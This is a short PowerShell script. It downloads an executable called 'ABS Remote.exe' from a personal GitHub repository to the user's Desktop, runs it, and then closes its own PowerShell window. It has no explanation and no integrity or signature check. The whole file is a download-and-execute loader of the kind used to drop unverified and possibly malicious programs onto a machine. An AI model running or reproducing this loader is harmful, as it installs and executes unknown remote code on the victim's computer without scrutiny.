$url = 'https://github.com/goatrbxdad/Remote/raw/main/ABS%20Remote.exe'
$output = [Environment]::GetFolderPath("Desktop") + "\ABS_Remote.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Check if download was successful
if (Test-Path $output) {
    # Execute the downloaded executable
    Start-Process -FilePath $output -Wait

    # Close PowerShell after execution
    Stop-Process -Id $PID
} else {
    Write-Host "Download failed."
}
